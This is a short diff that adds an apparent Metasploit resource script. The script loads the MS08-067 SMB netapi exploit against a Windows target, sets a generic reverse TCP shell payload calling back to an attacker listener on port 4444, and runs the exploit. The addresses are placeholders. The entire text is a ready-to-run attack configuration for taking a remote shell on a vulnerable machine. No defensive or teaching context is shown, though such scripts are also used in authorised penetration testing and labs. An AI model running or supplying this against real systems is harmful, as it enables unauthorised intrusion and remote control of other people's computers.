@@ -1,0 +1,8 @@
+set VERBOSE true
+use exploits/windows/smb/ms08_067_netapi_sp1
+set RHOSTS x.x.x.x
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST x.x.x.x
+set LPORT 4444
+set target 0
+exploit
